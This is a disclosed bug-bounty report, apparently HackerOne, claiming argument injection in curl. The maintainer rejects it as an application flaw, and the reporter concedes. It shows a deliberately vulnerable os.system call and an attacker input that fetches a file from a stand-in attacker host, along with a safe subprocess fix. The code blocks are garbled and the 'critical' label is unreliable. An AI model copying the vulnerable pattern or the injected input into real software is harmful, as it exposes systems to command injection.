---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
substate: "not-applicable"
weakness: "Command Injection - Generic"
enriched: true
date: 2026-04-13
submitted: 2026-04-13T05:18:05.407Z
bounty_usd: null
votes: 23
cve: []
program: "[[programs/curl|curl]]"
reporter: "midoussa7"
source: "https://hackerone.com/reports/3669305"
title: "Argument Injection via curl Short-Flag Grouping"
---
# Argument Injection via curl Short-Flag Grouping

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 23 | **Program:** curl | **Disclosed:** 2026-04-13

- Report: [https://hackerone.com/reports/3669305](https://hackerone.com/reports/3669305)
- CWE: Command Injection - Generic
- Submitted: 2026-04-13T05:18:05.407Z

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **2026-04-13** @midoussa7: ❌ The Unsafe Way (Vulnerable)Using os.system() or shell=True allows the shell to interpret spaces and dashes in the user input as new command flags.pythonimport os

# User input intended to be a URL
# Attacker input: "-os malicious.php http://attacker.com"
user_url = input("Enter URL to fetch: ")

# VULNERABLE: The shell parses the entire string
# Resulting command: curl -os malicious.php http://attacker.com
os.system(f"curl {user_url}") 
✅ The Safe Way (Recommended)Using subprocess.run() with a list of arguments and shell=False (the default) ensures that the user input is treated as a single literal string, not as executable 
```javascript
flags.pythonimport subprocess

user_url = input("Enter URL to fetch: ")
```
# SAFE: 'user_url' is treated strictly as an argument for the URL parameter.
# If the user enters "-os malicious.php", curl will simply try to 
# find a website named "-os malicious.php" and fail.
try:
```javascript
    subprocess.run(["curl", "--", user_url], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error fetching URL: {e}")
```
Use code with caution.Key Differences:List vs. String: By passing a list ["curl", user_url], you tell the operating system exactly which part is the program and which part is the data.The -- Separator: Adding -- before the user input tells curl to stop looking for flags entirely. Anything after -- is treated as a URL, even if it starts with a dash.No Shell: Setting shell=False prevents the system from using /bin/sh to parse the command, which neutralizes common injection characters like ;, &, and |.
- **2026-04-13** @bagder: If someone can inject something into the command line, then surely they can insert something there without relying on this?
- **2026-04-13** @bagder: This seems to describe a possibly vulnerable application that *uses* curl, not a vulnerability in curl.
- **2026-04-13** @midoussa7: hi @bagder You are exactly right. This is not a vulnerability in curl itself; it is a Command/Argument Injection vulnerability in the application that uses curl.In security terms, curl is working exactly as designed. The "vulnerability" exists in the glue code written by the developer.Why this is an Application Vulnerability:Trusting User Input: the application takes a string from a user and assumes it is a URL without checking if it starts with a dash (-).Improper Invocation: The application uses a "shell-aware" function (like system() or exec()) to run curl, which allows the attacker to inject new flags.Lack of Encapsulation: The developer failed to use the -- separator, which is the standard way to tell a command-line tool, "Stop looking for flags now; everything after this is just data."The "Tool vs. Implementation" DistinctionThe Tool (curl): Provides a -o flag to save files. This is a core feature.The Implementation: A web app that lets a user control the flags passed to that tool. This is a security flaw.
- **Report Not Applicable**
- **2026-04-13** @midoussa7: You are absolutely correct. To be clear: This is not a vulnerability in the curl tool itself.curl is a command-line utility designed to follow the flags a user provides. If a user (or an attacker) tells it to -o (output) to a file, curl is simply performing its intended function.The security report I drafted was intended to describe a vulnerability in an application that wraps curl, but I agree that the distinction is critical.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
